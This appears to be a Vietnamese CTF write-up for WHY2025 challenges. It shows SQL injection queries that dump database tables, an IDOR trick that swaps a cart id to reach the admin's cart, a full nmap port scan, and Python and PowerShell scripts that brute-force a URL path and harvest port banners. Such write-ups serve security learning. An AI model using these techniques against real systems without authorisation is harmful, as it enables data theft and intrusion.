# WHY2025 CTF

# Web/planets

- SELECT @@version, database()
- SELECT table_name FROM information_schema.tables WHERE table_schema = database()
- SELECT * FROM abandoned_planets

# Crypto/Substitute Teacher

- [https://www.dcode.fr/monoalphabetic-substitution](https://www.dcode.fr/monoalphabetic-substitution)
    
    ![image](https://hackmd.io/_uploads/SyTeKrVugl.png)
    

# Web/Shoe Shop 1.0

- Tạo 1 acc
- Thêm 1 đồ vào phần cart
- vào Cart, sửa id thành `1`
    
    ![image](https://hackmd.io/_uploads/B1W6FH4uxg.png)
    

> Note: Không hiểu lắm nhưng mà có thể là, đầu bài có nói là trong giỏ hàng của admin có cái đôi giày đặc biệt đấy, thì khi mình đặt hàng và vào giỏ hàng của mình sẽ được cấp 1 cái id bất kỳ, thì khi đấy vì là giỏ của admin thì thường sẽ là id=1 hoặc số gần đầu, nên khi chỉnh thành id thành 1 thì có được flag như vậy. Cái này gọi là access control vul thì phải.
> 

# Network/Scan Me

- Như yêu cầu đầu bài thì scan nó:

```
nmap -p- scanme.ctf.zone

```

- kết quả:

```
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-08-09 11:14 SE Asia Standard Time
Nmap scan report for scanme.ctf.zone (52.211.134.167)
Host is up (0.22s latency).
rDNS record for 52.211.134.167: 167.134.211.52.in-addr.arpa
Not shown: 65495 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    filtered ssh
2454/tcp  open     indx-dds
3871/tcp  open     avocent-adsap
7293/tcp  open     unknown
10962/tcp open     unknown
15160/tcp open     unknown
17983/tcp open     unknown
18395/tcp open     unknown
18728/tcp open     unknown
19185/tcp open     unknown
20447/tcp open     unknown
22258/tcp open     unknown
23990/tcp open     unknown
24196/tcp open     unknown
25161/tcp open     unknown
26525/tcp open     unknown
29115/tcp open     unknown
29172/tcp open     unknown
29762/tcp open     unknown
35486/tcp open     unknown
35725/tcp open     unknown
35943/tcp open     unknown
36650/tcp open     unknown
37299/tcp open     unknown
38897/tcp open     unknown
39461/tcp open     unknown
39961/tcp open     unknown
40632/tcp open     unknown
42747/tcp open     unknown
44426/tcp open     unknown
46045/tcp open     unknown
55283/tcp open     unknown
55305/tcp open     unknown
57932/tcp open     unknown
57937/tcp open     unknown
59220/tcp open     unknown
63931/tcp open     unknown
64199/tcp open     unknown
64471/tcp open     unknown
65534/tcp open     unknown

```

- Check thử 1 vài công thì mỗi cổng nó sẽ in ra 1 ký tự, vậy thì viết script như này để ghép tất cả các ký tự các cổng

```powershell
$Target = "scanme.ctf.zone"
$Ports = @(2454, 3871, 7293, 10962, 15160, 17983, 18395, 18728, 19185, 20447, 22258, 23990, 24196, 25161, 26525, 29115, 29172, 29762, 35486, 35725, 35943, 36650, 37299, 38897, 39461, 39961, 40632, 42747, 44426, 46045, 55283, 55305, 57932, 57937, 59220, 63931, 64199, 64471, 65534)
$Timeout = 1500

Write-Host "Bắt đầu thu thập các ký tự từ các cổng..." -ForegroundColor Green

$results = @{}
$SortedPorts = $Ports | Sort-Object

foreach ($port in $SortedPorts) {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connectTask = $tcpClient.ConnectAsync($Target, $port)

        if ($connectTask.Wait($Timeout)) {
            if ($tcpClient.Connected) {
                $stream = $tcpClient.GetStream()
                $stream.ReadTimeout = $Timeout

                $buffer = New-Object byte[] 1024
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)

                if ($bytesRead -gt 0) {
                    $response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()
                    $results[$port] = $response
                }
            }
        }
    } catch {
    } finally {
        if ($tcpClient) {
            $tcpClient.Close()
        }
    }
}

Write-Host "Thu thập hoàn tất. Đang ghép chuỗi..." -ForegroundColor Green

$flag = ""
foreach ($port in $SortedPorts) {
    if ($results.ContainsKey($port)) {
        $flag += $results[$port]
    }
}

Write-Host "-----------------------------------------"
Write-Host "Chuỗi ký tự ghép được là:"
Write-Host $flag -ForegroundColor Yellow
Write-Host "-----------------------------------------"

```

# Web/Buster

```python
import requests
import string
import sys

# --- Cấu hình ---
# URL cơ sở, không bao gồm phần flag
base_url = "<https://buster.ctf.zone/>"

# Phần flag đã biết mà bạn đã tìm ra
known_flag = ""

# Tập ký tự để thử. Thường bao gồm chữ thường, số, và một vài ký tự đặc biệt.
# Thêm cả dấu '}' để vòng lặp có thể kết thúc.
charset = "abcdef}" + string.digits
# string.ascii_lowercase

print(f"[*] Bắt đầu dò tìm flag từ: {base_url}{known_flag}")
print("[*] Tập ký tự sử dụng: " + charset)
print("-" * 30)

# Vòng lặp chính, tiếp tục cho đến khi tìm thấy dấu '}'
while not known_flag.endswith('}'):
    found_char_for_iteration = False
    for char in charset:
        # In ra ký tự đang thử trên cùng một dòng để không làm rối màn hình
        # sys.stdout.flush() đảm bảo nó được in ra ngay lập tức
        print(f"\\r[+] Đang thử: {known_flag}{char}", end="")
        sys.stdout.flush()

        # Xây dựng URL để kiểm tra
        test_url = f"{base_url}{known_flag}{char}"

        try:
            # Thực hiện yêu cầu GET
            response = requests.get(test_url)

            # Tăng hiệu suất bằng cách chỉ kiểm tra mã trạng thái trước
            if response.status_code == 200:
                # Kiểm tra điều kiện trong nội dung HTML
                if "Wrong way!" not in response.text:
                    # Tìm thấy ký tự đúng!
                    known_flag += char
                    # In kết quả đã tìm thấy ra một dòng mới
                    print(f"\\r[!] Tìm thấy ký tự tiếp theo: '{char}' -> Cờ hiện tại: {known_flag}")
                    found_char_for_iteration = True
                    break # Thoát khỏi vòng lặp for, bắt đầu lại với ký tự mới

        except requests.exceptions.RequestException as e:
            print(f"\\n[!] Lỗi mạng: {e}")
            print("[!] Thoát chương trình.")
            exit()

    # Nếu chạy hết vòng lặp for mà không tìm thấy ký tự nào
    if not found_char_for_iteration and not known_flag.endswith('}'):
        print(f"\\n[!] Không thể tìm thấy ký tự tiếp theo sau '{known_flag[-1]}'.")
        print("[!] Hãy thử mở rộng tập ký tự (ví dụ: thêm chữ hoa A-Z).")
        exit()

print("-" * 30)
print(f"[SUCCESS] Đã tìm thấy cờ hoàn chỉnh: {known_flag}")

```

![image](https://hackmd.io/_uploads/SyMI4oN_gl.png)